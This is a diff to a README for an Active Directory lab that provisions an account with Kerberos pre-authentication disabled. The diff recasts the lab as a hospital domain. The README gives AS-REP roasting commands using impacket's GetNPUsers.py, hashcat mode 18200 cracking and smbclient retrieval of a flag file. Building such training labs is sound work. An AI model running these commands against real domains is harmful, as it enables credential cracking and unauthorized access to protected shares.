@@ -2,9 +2,10 @@
 
 A single-container Active Directory lab built with [Isoloom](https://www.isoloom.com):
 [`isoloom.yml`](isoloom.yml) describes one Samba Domain Controller for the realm
-**NORTH.SEVENKINGDOMS.LOCAL** — no Windows VMs. It provisions a set of ordinary domain users
-plus one account whose Kerberos pre-authentication is disabled (`jon.snow`,
-`UF_DONT_REQUIRE_PREAUTH`, with a weak RC4 key), and a `vault` share only `jon.snow` may read.
+**LAKESIDE.LAB** (Lakeside Regional Hospital, a healthcare provider) — no Windows VMs. It
+provisions a set of ordinary hospital staff users plus one legacy document-scanner service
+account whose Kerberos pre-authentication is disabled (`svc-scanner`, `UF_DONT_REQUIRE_PREAUTH`,
+with a weak RC4 key), and an `imaging` share only `svc-scanner` may read.
 
 | Machine | Service |
 | --- | --- |
@@ -17,10 +18,10 @@ An account with Kerberos pre-authentication disabled (`userAccountControl` bit
 long-term key — which can be cracked offline. The real-world technique needs no credentials:
 
 1. AS-REP roast a username list with impacket:
-   `GetNPUsers.py NORTH.SEVENKINGDOMS.LOCAL/ -usersfile users.txt -no-pass -dc-ip <dc> -format hashcat`
-   → against a Windows AD DC, a `$krb5asrep$23$jon.snow@...` hash for the account missing pre-auth.
+   `GetNPUsers.py LAKESIDE.LAB/ -usersfile users.txt -no-pass -dc-ip <dc> -format hashcat`
+   → against a Windows AD DC, a `$krb5asrep$23$svc-scanner@...` hash for the account missing pre-auth.
 2. Crack it offline: `hashcat -m 18200 asrep.hash rockyou.txt`.
-3. Read the flag: `smbclient //dc/vault -U 'NORTH\jon.snow%<cracked>' -c 'get flag.txt'`.
+3. Read the flag: `smbclient //dc/imaging -U 'LAKESIDE\svc-scanner%<cracked>' -c 'get flag.txt'`.
 
 ### Samba caveat (important)
 
